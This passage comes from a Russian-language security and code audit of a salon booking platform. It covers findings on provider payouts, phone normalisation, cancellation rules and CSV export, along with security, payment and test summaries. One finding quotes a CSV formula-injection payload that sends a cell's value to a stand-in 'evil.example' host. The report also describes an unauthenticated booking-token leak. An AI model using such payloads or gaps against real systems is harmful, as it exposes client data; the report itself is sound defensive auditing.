7. **Возможные последствия:** Избыточное потребление памяти и трафика между PostgreSQL и Node.js.
8. **Как воспроизвести:** Открыть `/admin/logs` — даже если в логах всего 10 записей, выполняется `SELECT id, name FROM businesses` по всей таблице.
9. **Рекомендуемое исправление:** В `getAdminUsers()` использовать `SELECT provider_id, count(*) FROM businesses WHERE provider_id IS NOT NULL GROUP BY provider_id`, а в `getPlatformAuditLogs()` выбирать только `inArray(businesses.id, entityIds)`.
10. **Статус предыдущей проблемы:** **PARTIALLY FIXED**

---

### `P2-3` (Частично исправлено) — Обычный индекс вместо `UNIQUE` индекса на `users.phone`
1. **ID:** `P2-3`
2. **Приоритет:** **P2 — Medium**
3. **Название:** На колонке `users.phone` создан обычный B-Tree индекс `users_phone_idx`, но отсутствует ограничение уникальности `UNIQUE` на уровне СУБД.
4. **Файл и конкретная строка:** `src/server/db/schema.ts`, строка `143`; `drizzle/0008_p2_indexes_and_constraints.sql`, строка `1`.
5. **Описание проблемы:** Уникальность телефона проверяется программно (`SELECT ... WHERE phone = ...`) перед `INSERT`/`UPDATE` в `registerAction`, `providerConnectClientAction` и `updateProfileAction`, но в PostgreSQL нет `CREATE UNIQUE INDEX users_phone_uq ON users (phone) WHERE phone IS NOT NULL`.
6. **Сценарий возникновения:** Два одновременных запроса регистрации с одинаковым номером телефона (`race condition`).
7. **Возможные последствия:** Появление двух пользователей с одинаковым `phone`, после чего при входе по номеру телефона `loginAction` будет возвращать `limit(1)` (первого попавшегося пользователя).
8. **Как воспроизвести:** Отправить два параллельных POST-запроса в `registerAction` с разными `email`, но одинаковым `phone`.
9. **Рекомендуемое исправление:** Добавить частичный уникальный индекс `CREATE UNIQUE INDEX IF NOT EXISTS "users_phone_uq" ON "users" ("phone") WHERE "phone" IS NOT NULL;`.
10. **Статус предыдущей проблемы:** **PARTIALLY FIXED**

---

### `P2-5` (Не исправлено) — Отсутствие внешних каналов уведомлений (SMS / Telegram / Email)
1. **ID:** `P2-5`
2. **Приоритет:** **P2 — Medium**
3. **Название:** Отсутствие отправки уведомлений клиентам и администраторам.
4. **Файл и конкретная строка:** `src/server/db/schema.ts`, строка `323` (`reminderSentAt`).
5. **Описание проблемы:** После удаления Telegram-интеграции в миграции `0006` в проекте нет отправки SMS или сообщений клиентам со ссылкой `/b/[token]`. Если клиент закроет вкладку браузера сразу после записи, он потеряет ссылку на управление записью.
6. **Сценарий возникновения:** Обычная онлайн-запись клиента через `/[slug]`.
7. **Возможные последствия:** Повышенный процент неявок (`NO_SHOW`) и обращений в салон по телефону.
8. **Как воспроизвести:** Создать запись на `/atelier-noir` — ссылка `/b/[token]` отображается только на экране успеха в браузере.
9. **Рекомендуемое исправление:** Интегрировать SMS-шлюз Узбекистана (Eskiz.uz / PlayMobile) для отправки ссылки `/b/[token]` и напоминаний.
10. **Статус предыдущей проблемы:** **NOT FIXED**

---

### `NEW-P2-1` — Исчезновение исторического заработка провайдера (`totalProviderPayout`) при продлении или истечении подписки
1. **ID:** `NEW-P2-1`
2. **Приоритет:** **P2 — Medium**
3. **Название:** Финансовая статистика провайдера учитывает только подписки со статусом `ACTIVE` и обнуляет прошлые периоды при продлении или истечении.
4. **Файл и конкретная строка:** `src/server/business/admin.ts`, строки `313–330` (`getAdminProviders`) и `436–446` (`getProviderDashboardData`).
5. **Описание проблемы:**
   - В `getAdminProviders()` выручка и выплаты провайдеру считаются только по `const activeSubs = provSubs.filter((s) => s.status === "ACTIVE")`.
   - В `getProviderDashboardData()` для каждого клиента выбирается только одна `latestSubscription`, и сумма добавляется в `totalGrossPaid` / `totalEarnedCard` только если `sub?.status === "ACTIVE"`.
   - При этом, когда клиент оплачивает второй месяц подписки, `completePayment()` (`src/server/payments/service.ts:310-314`) переводит предыдущую `ACTIVE`-подписку в статус `CANCELLED`, а когда подписка истекает по времени, `expireSubscriptions()` (`src/server/subscriptions/expiry.ts:43`) переводит её в `PAST_DUE`.
6. **Сценарий возникновения:** Салон, подключённый провайдером, оплачивает подписку 3 месяца подряд по 300 000 UZS (выплата провайдеру должна составить `3 × 180 000 = 540 000 UZS`), либо подписка истекает через 30 дней.
7. **Возможные последствия:**
   - В дашборде провайдера `/provider` и в `/admin/providers` вместо `540 000 UZS` отображается только последний месяц (`180 000 UZS`), а если салон не продлил подписку вовремя (`PAST_DUE`) — заработок провайдера по этому клиенту падает в **0 UZS**!
8. **Как воспроизвести:** Оплатить подписку салона провайдера, затем запустить `expireSubscriptions()` с датой `+31 день`: `totalProviderPayout` и `totalEarnedCard` станут равны `0`.
9. **Рекомендуемое исправление:** Считать исторический заработок провайдера по всем фактически оплаченным периодам (например, `s.status === "ACTIVE" || s.status === "PAST_DUE" || (s.status === "CANCELLED" && s.providerPayoutAmount !== null && s.note?.includes("Оплачено"))`), либо добавить булеву колонку `isPaid: boolean` в таблицу `subscriptions` и агрегировать `WHERE is_paid = true`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P2-2` — Отсутствие нормализации телефона в `saveClientAction` и обход `clientLimitError` в `updateClientNotesAction`
1. **ID:** `NEW-P2-2`
2. **Приоритет:** **P2 — Medium**
3. **Название:** Несогласованная нормализация телефонного номера клиента в CRM и обход лимита клиентов через заметки.
4. **Файл и конкретная строка:** `src/server/actions/clients.ts`, строки `380–416` (`updateClientNotesAction`) и `431–458` (`saveClientAction`).
5. **Описание проблемы:**
   - В `saveClientAction()` строка `432` читает `const phone = String(formData.get("phone") ?? "").trim()` без вызова `normalizePhone(phone)`. Функция `clientLimitError(business, phone)` внутри себя нормализует номер (`+998901234567`), но в таблицу `clients` на строке `447` вставляется **ненормализованная** строка (например, `+998 90 123-45-67`). При повторном сохранении того же клиента `clientLimitError` ищет в БД `+998901234567`, не находит его и считает существующего клиента новым!
   - В `updateClientNotesAction()` (строки `404–412`), если записи в `clients` ещё нет, выполняется `await db.insert(clients).values(...)` **без вызова `clientLimitError(business, phone)`**.
6. **Сценарий возникновения:** Владелец салона добавляет или редактирует клиента в `/dashboard/clients`, вводя телефон с пробелами или дефисами.
7. **Возможные последствия:** Ложное срабатывание лимита `customClientLimit` при редактировании существующего клиента с пробелами в номере, либо обход лимита через `updateClientNotesAction`.
8. **Как воспроизвести:** Сохранить в `/dashboard/clients` клиента с номером `+998 90 111 22 33` при `customClientLimit = 1`, а затем попытаться отредактировать его имя — `clientLimitError` заблокирует обновление.
9. **Рекомендуемое исправление:** В `saveClientAction` и `updateClientNotesAction` нормализовать телефон через `const phone = normalizePhone(rawPhone)` перед проверкой и записью в БД, а перед `db.insert(clients)` в `updateClientNotesAction` вызывать `clientLimitError(business, phone)`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P2-3` — Настройки салона `cancellationHours` и `requireEmail` не проверяются на сервере
1. **ID:** `NEW-P2-3`
2. **Приоритет:** **P2 — Medium**
3. **Название:** Серверная логика бронирования игнорирует настройки `business.settings.cancellationHours` и `business.settings.requireEmail`.
4. **Файл и конкретная строка:** `src/server/booking/service.ts`, строки `85`, `350–352`, `391–393`.
5. **Описание проблемы:**
   - В `/dashboard/profile` владелец салона настраивает «Отмена не позже чем за X ч» (`cancellationHours`, по умолчанию 3 часа) и «Спрашивать email» (`requireEmail`).
   - В `cancelBooking()` (`service.ts:350`) и `rescheduleBooking()` (`service.ts:391`) проверяется только `if (booking.endAt.getTime() < Date.now())`. Клиент может отменить или перенести запись за 5 минут до начала (или даже во время самой процедуры, пока `now < endAt`), несмотря на установленный запрет `cancellationHours = 24`.
   - В `createBooking()` (`service.ts:85`) не проверяется `if (input.business.settings.requireEmail && !input.email?.trim())`.
6. **Сценарий возникновения:** Клиент отменяет запись по ссылке `/b/[token]` за 10 минут до визита в салоне, где установлено правило отмены за 12 часов.
7. **Возможные последствия:** Нарушение бизнес-правил салона и простой мастеров.
8. **Как воспроизвести:** Установить в `/dashboard/profile` «Отмена не позже чем: За 24 ч», создать запись на сегодня через 2 часа и нажать «Отменить» на странице `/b/[token]` — запись отменится без ошибки.
9. **Рекомендуемое исправление:** В `cancelBooking` и `rescheduleBooking` загружать `business.settings.cancellationHours` и проверять `booking.startAt.getTime() - Date.now() < cancellationHours * 3600_000`; в `createBooking` проверять `requireEmail`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P2-4` — Отсутствие расчёта комиссии провайдера в `setBusinessPlanAction`
1. **ID:** `NEW-P2-4`
2. **Приоритет:** **P2 — Medium**
3. **Название:** При ручном назначении платного тарифа администратором через `setBusinessPlanAction` поля `providerCommissionPercent` и `providerPayoutAmount` остаются `null`.
4. **Файл и конкретная строка:** `src/server/actions/admin.ts`, строки `99–111`.
5. **Описание проблемы:** Если администратор вручную переключает тариф салона, подключённого провайдером, в `/admin/businesses` (`setBusinessPlanAction`), в таблицу `subscriptions` записываются `providerId: existing.providerId` и `amount: effectiveAmount`, но не вычисляются `providerCommissionPercent` и `providerPayoutAmount`. Из-за этого в `getAdminOverview()` (`admin.ts:162`: `activeSubs.reduce((sum, row) => sum + (row.providerPayoutAmount ?? 0), 0)`) сумма `providerPayoutsMrr` занижается.
6. **Сценарий возникновения:** Админ активирует платный тариф салону провайдера через выпадающий список тарифов в `/admin/businesses` вместо кнопки одобрения заявки в `/admin/requests`.
7. **Возможные последствия:** Расхождение показателя `providerPayoutsMrr` на главной странице `/admin` с данными в `/admin/providers`.
8. **Как воспроизвести:** Назначить тариф `PRO` салону провайдера через `setBusinessPlanAction` и проверить `provider_payout_amount` в таблице `subscriptions` (`NULL`).
9. **Рекомендуемое исправление:** В `setBusinessPlanAction` при наличии `existing.providerId` и `plan !== "TRIAL"` подгружать `users.commissionPercent` провайдера и заполнять `providerCommissionPercent` и `providerPayoutAmount`, как это уже сделано в `approveSubscriptionAction`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

## 9. P3 Findings (Проблемы низкого приоритета и технический долг)

### `NEW-P3-1` — CSV Formula Injection при экспорте клиентов (`exportClientsCsvAction`)
1. **ID:** `NEW-P3-1`
2. **Приоритет:** **P3 — Low**
3. **Название:** Отсутствие экранирования начальных символов формул (`=`, `+`, `-`, `@`, `\t`, `\r`) при генерации CSV-файла клиентов.
4. **Файл и конкретная строка:** `src/server/actions/clients.ts`, строки `488–514`.
5. **Описание проблемы:** Поля `c.name`, `c.phone`, `c.email`, `c.notes` оборачиваются в двойные кавычки, но если клиент при онлайн-записи указал имя `=HYPERLINK("https://evil.example/?d="&A1)` или `=1+1`, Excel при открытии CSV исполнит формулу.
6. **Сценарий возникновения:** Владелец салона нажимает «Экспорт CSV» в `/dashboard/clients` и открывает файл в Microsoft Excel.
7. **Возможные последствия:** Выполнение формул в табличном процессоре владельца салона.
8. **Как воспроизвести:** Создать клиента с именем `=2+2` и экспортировать CSV.
9. **Рекомендуемое исправление:** Префиксировать значения ячеек, начинающиеся с `[=+\-@\t\r]`, апострофом `'`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P3-2` — Потеря `.data/consumed-jtis.json` при пересоздании Docker-контейнера
1. **ID:** `NEW-P3-2`
2. **Приоритет:** **P3 — Low**
3. **Название:** Файл использованных Refresh-токенов `.data/consumed-jtis.json` сохраняется вне смонтированного Docker-тома `/app/.data/uploads`.
4. **Файл и конкретная строка:** `docker-compose.yml`, строка `39`; `src/server/api/v1/auth.ts`, строка `17`.
5. **Описание проблемы:** В `docker-compose.yml` том `uploads` примонтирован к `/app/.data/uploads`, тогда как `JTI_STORE_PATH` указывает на `/app/.data/consumed-jtis.json`. При обычном рестарте процесса внутри контейнера файл сохраняется, но при `docker compose up -d --build` (пересоздании контейнера) слой `/app/.data` очищается.
6. **Сценарий возникновения:** Обновление версии приложения в Docker через `docker compose up -d --build`.
7. **Возможные последствия:** Сброс списка использованных `refreshToken` после деплоя новой версии.
8. **Как воспроизвести:** Проверить `volumes` сервиса `app` в `docker-compose.yml:39`.
9. **Рекомендуемое исправление:** Хранить `consumed-jtis.json` внутри `/app/.data/uploads/.consumed-jtis.json` (или примонтировать том к `/app/.data`), либо хранить JTI в PostgreSQL.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P3-3` — Отсутствие записи в `audit_logs` при отмене или переносе брони клиентом по токену `/b/[token]`
1. **ID:** `NEW-P3-3`
2. **Приоритет:** **P3 — Low**
3. **Название:** Функции `cancelBooking()` и `rescheduleBooking()` пишут лог только в stdout (`logger.info`), но не в таблицу `audit_logs`.
4. **Файл и конкретная строка:** `src/server/booking/service.ts`, строки `364–370` и `463–469`.
5. **Описание проблемы:** Создание записи (`createBooking`) и действия владельца салона (`setBookingStatus`) создают записи в `audit_logs`, которые видны главному владельцу в `/admin/logs`. Однако отмена или перенос записи самим клиентом по ссылке `/b/[token]` не вызывает `recordAuditLog()`.
6. **Сценарий возникновения:** Клиент отменяет запись через `/b/[token]`.
7. **Возможные последствия:** В `/admin/logs` во вкладке «Действия салонов» не видно, что запись была отменена клиентом.
8. **Как воспроизвести:** Отменить запись на `/b/[token]` и проверить `/admin/logs`.
9. **Рекомендуемое исправление:** Добавить вызов `recordAuditLog({ action: "salon.booking_cancelled_by_client", entityType: "business", entityId: booking.businessId, ... })` в `cancelBooking` и `rescheduleBooking`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

## 10. Security Assessment (Оценка информационной безопасности)

| Область безопасности | Статус | Подробная техническая оценка |
| :--- | :---: | :--- |
| **Authentication & Password Security** | ✅ **Надёжно** | Пароли хешируются через `bcryptjs` (cost 12 в `src/server/auth/session.ts:17`). Сессионные JWT в cookie `uzbook_session` (`httpOnly`, `sameSite: "lax"`, `secure` в prod) и Bearer JWT содержат отпечаток `ver = tokenFingerprint(passwordHash, role)`, который мгновенно инвалидирует все сессии при смене пароля или роли. |
| **Timing Attack Protection** | ✅ **Надёжно** | И в `loginAction` (`src/app/(auth)/actions.ts:243`), и в `POST /api/v1/auth/login` (`src/app/api/v1/auth/login/route.ts:52`) используется `DUMMY_PASSWORD_HASH` при отсутствии пользователя. |
| **RBAC & Multi-Tenant Isolation** | ✅ **Надёжно** | В серверных экшенах и `/dashboard/layout.tsx` доступ разделён между `OWNER`/`ADMIN`, `PROVIDER` и `SUPPORT`. Все операции изменения данных салона фильтруются по `and(eq(table.id, id), eq(table.businessId, business.id))`. Провайдер видит и изменяет только салоны с `eq(businesses.providerId, session.id)`. |
| **IDOR & Broken Access Control** | ⚠️ **Требует исправления `NEW-P1-1`** | Страница `/pay/[id]` теперь защищена (`requireUser()` + проверка владельца/провайдера/админа). Однако публичный эндпоинт `GET /api/v1/bookings?phone=` (`NEW-P1-1`) отдаёт чужие `manageToken` без авторизации. |
| **SQL Injection** | ✅ **Защищено** | Все запросы используют параметризованные выражения Drizzle ORM (`eq`, `inArray`, `sql\`...\``). Конкатенации строк в SQL нет. |
| **XSS & HTML Sanitization** | ✅ **Защищено** | Ссылки в `trusted_logos` проверяются на `^https?:\/\/`. Секции `page_sections` валидируются строгими Zod-схемами с очисткой HTML. Загрузка файлов (`/api/uploads/[name]`) проверяет magic bytes (PNG/JPEG/WebP/GIF), запрещает SVG и отдаёт файлы с `Content-Security-Policy: default-src 'none'; sandbox` и `X-Content-Type-Options: nosniff`. |
| **HTTP Security Headers** | ✅ **Настроено** | В `next.config.ts:29-77` настроены `Content-Security-Policy`, `Strict-Transport-Security`, `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Cross-Origin-Opener-Policy`, `Referrer-Policy: no-referrer` для `/b/:path*` и `/pay/:path*`, и `Permissions-Policy`. |

---

## 11. Payment & Subscription Assessment (Аудит платежей и подписок)

### 11.1. Проверка обязательных финансовых сценариев

#### Сценарий A — Прямая продажа платформы (`providerId = null`)
- **Входные данные:** Салон без провайдера (`business.providerId = null`), цена `300 000 UZS` (или стандартная цена тарифа `199 000 / 399 000 UZS`).
- **Проверка по коду (`src/server/payments/service.ts:275-288`):**
  - `assignedProviderId` равен `null`.
  - `providerCommissionPercent` = `null`, `providerPayoutAmount` = `null`.
  - Вся сумма (`100%`) фиксируется как выручка платформы, выплата провайдерам = `0 UZS`.
- **Вердикт:** **РАБОТАЕТ КОРРЕКТНО.**

#### Сценарий B — Продажа через провайдера (`customPriceUzs = 300 000 UZS`, `commissionPercent = 60%`)
- **Входные данные:** Салон подключён провайдером (`business.providerId = <uuid>`), `business.customPriceUzs = 300 000`, у провайдера `users.commissionPercent = 60`.
- **Проверка по коду:**
  1. При создании платежа (`createPayment` в `src/server/payments/service.ts:57-58`):
     `effectiveAmountUzs = effectivePlanPriceUzs(plan, business.customPriceUzs)` → в таблицу `payments` и в URL чекаута Payme/Click передаётся ровно **`300 000 UZS`** (в Payme — `30 000 000` тийинов).
  2. В вебхуках Payme (`src/app/api/payments/payme/route.ts:156-161, 187-192`) и Click (`src/app/api/payments/click/route.ts:151, 160, 218`):
     Сверяется сумма `row.payment.amount` (`300 000 UZS`), подмена суммы со стороны браузера невозможна.
  3. При завершении оплаты (`completePayment` в `src/server/payments/service.ts:275-366` и `approveSubscriptionAction` в `src/server/actions/admin.ts:248-277`):
     - Считывается `provUser.commissionPercent` (`60%`) из таблицы `users`.
     - Вычисляется `providerPayoutAmount = Math.round((300000 * 60) / 100) = 180 000 UZS`.
     - Чистый доход платформы составляет `300 000 - 180 000 = 120 000 UZS` (`40%`).
     - Существующая `PENDING`-заявка провайдера переводится в `ACTIVE` (с сохранением `customStaffLimit` и `customClientLimit`), а предыдущие `ACTIVE`/`PENDING` записи переводятся в `CANCELLED`.
- **Вердикт:** **РАБОТАЕТ КОРРЕКТНО.** (Единственное замечание по отчётности — см. `NEW-P2-1` и `NEW-P2-4`).

---

## 12. Database Assessment (Аудит базы данных)

1. **Схема и миграции (`drizzle/0000` .. `0008`):**
   - Все 9 миграций (`0000_useful_wolfpack.sql` .. `0008_p2_indexes_and_constraints.sql`) консистентны и зарегистрированы в `drizzle/meta/_journal.json`.
   - Миграция `0008` добавила индексы `users_phone_idx`, `subscriptions_provider_idx`, `subscriptions_business_status_idx` и уникальный частичный индекс `subscriptions_one_active_per_biz_uq` (`ON subscriptions (business_id) WHERE status = 'ACTIVE'`), который гарантирует на уровне PostgreSQL невозможность появления двух одновременных `ACTIVE`-подписок у одного бизнеса.
2. **Транзакции и блокировки:**
   - В `createBooking` и `rescheduleBooking` используется транзакционная блокировка строки мастера `SELECT id FROM staff WHERE id = ... FOR UPDATE`.
   - В `completePayment`, `markPaymentPending`, `refundPayment` и `approveSubscriptionAction` используется `SELECT ... FOR UPDATE`.
   - Все вызовы `recordAuditLog()` вынесены за пределы `db.transaction`, что исключает дедлоки на PGlite.

---

## 13. Performance Assessment (Аудит производительности)

1. **Публичная страница салона `/[slug]` (`FIXED`):**
   - Вместо прежних 37–565 запросов `computeSlots` в цикле теперь вызывается `getBatchPreviewSlotsForStaff()` (`src/server/booking/slots.ts:168-273`), который загружает `working_hours`, `schedule_exceptions` и `bookings` для всех мастеров салона сразу за **3 SQL-запроса** и вычисляет свободные окна в памяти за ~2–5 мс.
2. **Места, требующие оптимизации при росте до 5 000–10 000 салонов:**
   - В `getAdminOverview()` (`src/server/business/admin.ts:117-152`) 8 независимых агрегатных запросов выполняются последовательно через `await` вместо `Promise.all([...])`.
   - В `getClientsAction()` (`src/server/actions/clients.ts:94-117`) выгружаются все исторические записи `bookings` салона для подсчёта LTV и любимой услуги в памяти JS вместо SQL-агрегации `GROUP BY client_phone`.
   - В `getAdminUsers()` и `getPlatformAuditLogs()` (`src/server/business/admin.ts:186, 489`) остаётся выгрузка таблицы `businesses` без `WHERE`.

---

## 14. Testing Results (Результаты тестирования)

В рамках повторного аудита были проверены компиляция, типизация, существующие интеграционные тесты и ответы живого сервера:

| Проверка / Тестовый набор | Команда | Результат | Что именно проверено |
| :--- | :--- | :---: | :--- |
| **TypeScript Static Check** | `node .\node_modules\typescript\bin\tsc --noEmit` | ✅ **PASS (exit 0)** | Строгая типизация всех 100+ файлов `.ts`/`.tsx` без единой ошибки. |
| **Next.js Production Build** | `node .\node_modules\next\dist\bin\next build` | ✅ **PASS (exit 0)** | Сборка всех 46 маршрутов App Router, проверка `"use server"` экшенов и генерация статики. |
| **Phase 1 Suite (`test-p0-fixes.ts`)** | `tsx scripts/test-p0-fixes.ts` | ✅ **PASS (exit 0)** | `normalizeAuthPhone`; оплата салона провайдера (`300 000 UZS × 60% = 180 000 UZS`); идемпотентность повторного `completePayment`; прямая продажа (`199 000 UZS` → 100% платформе). |
| **Phase 2 Suite (`test-p1-fixes.ts`)** | `tsx scripts/test-p1-fixes.ts` | ✅ **PASS (exit 0)** | Сохранность `trusted_logos` при `findReferencedUploadNames()`; блокировка 3-го клиента при `customClientLimit = 2` и пропуск существующего клиента; `isPaymentExpired()` для `CREATED` и `PENDING`. |
| **Phase 3 Suite (`test-p2-fixes.ts`)** | `tsx scripts/test-p2-fixes.ts` | ✅ **PASS (exit 0)** | Блокировка `writeBlockedReason` после `refundPayment()`; отказ СУБД при вставке второй `ACTIVE`-подписки; пакетный расчёт слотов `getPublicBusiness`; SQL-фильтрация провайдеров; защита от повтора `verifyRefreshToken`. |
| **Payments Lifecycle (`test-payments-lifecycle.ts`)** | `tsx scripts/test-payments-lifecycle.ts` | ✅ **PASS (exit 0)** | Жизненный цикл платежей Crypto/Demo, экспирация, рефанд, отмена админом, сверка `reconcilePaymentSubscription`, маскирование секретов. |
| **Live HTTP & Security Probe** | `Invoke-WebRequest` (`localhost:3000`) | ⚠️ **PASS с находкой `NEW-P1-1`** | `/api/health`, `/`, `/login`, `/register`, `/become-provider`, `/atelier-noir` → `200 OK`. Эндпоинт `GET /api/v1/bookings?phone=%2B998901234567` вернул `200 OK` без авторизации (подтверждена уязвимость `NEW-P1-1`). |

---

## 15. Production Readiness Checklist (Чек-лист готовности к Production)

- [x] Производственная сборка `next build` и `tsc --noEmit` проходят без ошибок.
- [x] Создание бизнеса на `/onboarding` работает без блокировок БД.
- [x] Индивидуальные цены провайдеров (`customPriceUzs`) и комиссия 60% (`commissionPercent`) рассчитываются строго на сервере.
- [x] Дублирование `ACTIVE`-подписок заблокировано как в коде, так и уникальным индексом БД `subscriptions_one_active_per_biz_uq`.
- [x] Загруженные логотипы карусели «Нам доверяют» защищены от удаления сборщиком мусора.
- [x] Настроены заголовки безопасности `CSP`, `HSTS`, `X-Frame-Options`, `X-Content-Type-Options`, `Permissions-Policy`.
- [x] Устранён каскад N+1 запросов на публичной странице салона `/[slug]`.
- [ ] **Блокер `NEW-P1-1`:** Закрыть публичную выдачу `manageToken` и PII по номеру телефона в `GET /api/v1/bookings?phone=`.
- [ ] **Блокер `NEW-P1-2`:** Подключить проверку `writeBlockedReason(business)` во все пишущие экшены бронирований, клиентов, быстрых действий и API.
- [ ] **Блокер `NEW-P1-3`:** Проверять `session.id === business.ownerId` при установке `source = "MANUAL"` в `POST /api/public/[slug]/bookings`.
- [ ] **Желательно (`NEW-P2-1`):** Сохранять исторические выплаты провайдерам при продлении/истечении подписок.

---

## 16. Рекомендованный порядок исправлений (Remediation Roadmap)

### Шаг 1 — Немедленные исправления перед открытием трафика (P1, ~2–3 часа):
1. **`NEW-P1-1` (`src/app/api/v1/bookings/route.ts:120-192`):** Требовать `authenticateBearer(request)` в `GET /api/v1/bookings`, фильтровать записи по `eq(bookings.businessId, business.id)` и не возвращать секретный `manageToken` в поисковой выдаче по номеру телефона.
2. **`NEW-P1-3` (`src/app/api/public/[slug]/bookings/route.ts:63-64`):** Устанавливать `source = "MANUAL"` только если `session && (session.id === business.ownerId || session.role === "ADMIN")`.
3. **`NEW-P1-2` (`src/server/actions/bookings.ts`, `clients.ts`, `quick-actions.ts`, `profile.ts`, `src/server/booking/service.ts`, `src/app/api/v1/owner/bookings/[id]/status/route.ts`):** Добавить проверку `writeBlockedReason(business)` во все функции создания и модификации записей/клиентов, а также блокировать онлайн-запись в салоны с истёкшей подпиской/триалом.

### Шаг 2 — Финансовая точность и целостность данных (P2, ~1 день):
4. **`NEW-P2-1` и `NEW-P2-4` (`src/server/business/admin.ts`, `src/server/actions/admin.ts`):** Заполнять `providerCommissionPercent` и `providerPayoutAmount` в `setBusinessPlanAction` и считать суммарный заработок провайдера по всем оплаченным подпискам (включая завершённые периоды), а не только по текущему `ACTIVE` ряду.
5. **`NEW-P2-2` (`src/server/actions/clients.ts`):** Нормализовать телефон через `normalizePhone()` перед сохранением в `saveClientAction` и добавить вызов `clientLimitError()` в `updateClientNotesAction`.
6. **`NEW-P2-3` (`src/server/booking/service.ts`):** Проверять `business.settings.cancellationHours` при отмене/переносе клиентом и `business.settings.requireEmail` при создании записи.
7. **`P2-3` (`src/server/db/schema.ts`):** Заменить обычный индекс `users_phone_idx` на частичный уникальный индекс `WHERE phone IS NOT NULL`.

### Шаг 3 — Инфраструктура и полировка (P3):
8. **`NEW-P3-1` (`src/server/actions/clients.ts`):** Экранировать формулы (`=`, `+`, `-`, `@`) при экспорте CSV.
9. **`NEW-P3-2` (`docker-compose.yml`):** Перенести `consumed-jtis.json` в сохраняемый том или таблицу PostgreSQL.
10. **`NEW-P3-3` (`src/server/booking/service.ts`):** Записывать события клиентской отмены и переноса (`/b/[token]`) в `audit_logs`.

---

## 17. Финальное заключение

Повторный независимый аудит подтверждает, что команда разработки **успешно и качественно устранила все 3 критических блокера P0 (`P0-1`, `P0-2`, `P0-3`), все 7 первоначальных проблем P1 (`P1-1` .. `P1-7`), ключевые проблемы производительности P2 (N+1 на `/[slug]`, индексы БД, возврат триала при рефанде) и дедлок транзакции на странице `/onboarding`**.

Финансовая модель расчёта индивидуальных цен (`customPriceUzs`) и 60% комиссии провайдеров при онлайн-оплате и ручном подтверждении теперь работает на серверной стороне надёжно и идемпотентно.

Вместе с тем, проект получил оценку **78 / 100**, так как независимая проверка выявила **3 новые проблемы высокого приоритета (`NEW-P1-1`, `NEW-P1-2`, `NEW-P1-3`)**, связанные с неаутентифицированным получением `manageToken` по номеру телефона в REST API v1, неполным охватом проверки `writeBlockedReason(business)` в модулях бронирования/CRM и обходом анти-спам лимита при наличии любой сессии. После устранения этих трёх точечных проблем платформа достигнет уровня **92–95 / 100** и будет полностью готова к промышленному запуску.
